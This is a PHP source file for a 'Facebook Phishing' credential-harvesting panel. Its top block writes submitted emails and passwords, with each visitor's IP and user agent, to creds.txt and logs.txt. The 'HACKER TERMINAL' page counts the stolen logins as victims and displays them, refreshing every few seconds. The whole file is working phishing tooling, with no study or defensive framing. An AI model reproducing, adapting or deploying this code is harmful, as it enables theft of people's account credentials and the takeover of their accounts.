<?php
if ($_POST) {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 100);
    $time = date('Y-m-d H:i:s');
    $log = "[{$time}] 🎣 {$email}:{$pass} | 💻 IP:{$ip} | 📱 UA:{$ua}\n";
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    file_put_contents('logs.txt', $log, FILE_APPEND | LOCK_EX); // ← AJOUTÉ
    header('Location: terminal.php?newhit=1');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🔥 HACKER TERMINAL v2.0</title>
    <meta http-equiv="refresh" content="5">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
        .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
        .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
        .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
        .email{color:#ff0;font-weight:bold;}
        .ip{color:#0ff;}
        .time{color:#ff6600;}
        input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
        .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
        .btn:hover{background:#0a0;}
        .btn-red{background:#f00;color:#fff;}
    </style>
</head>
<body>
    <div class="header">
        🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
    </div>
    <div class="console" id="console">
        <?php
        if (file_exists('creds.txt')) {
            $logs = file_get_contents('creds.txt');
            $lines = array_filter(explode("\n", $logs));
            $count = count($lines);
            echo "<div>📊 Total victims: <span style='color:#ff0'>{$count}</span></div>";
            foreach (array_reverse($lines) as $line) {
                if (trim($line)) {
                    echo "<div class='hit'>{$line}</div>";
                }
            }
        }
        if (isset($_GET['newhit'])) {
            echo "<div class='hit' style='border-left-color:#ff0;animation:pulse 1s'>🎯 NEW HIT DETECTED! Refreshing...</div>";
        }
        ?>
    </div>
    <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
        <input name="email" placeholder="👤 Email cible..." autocomplete="off">
        <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
        <button type="submit" class="btn">🎣 Lancer Phishing</button>
        <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
    </form>
    <script>
    setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
    </script>
</body>
</html>

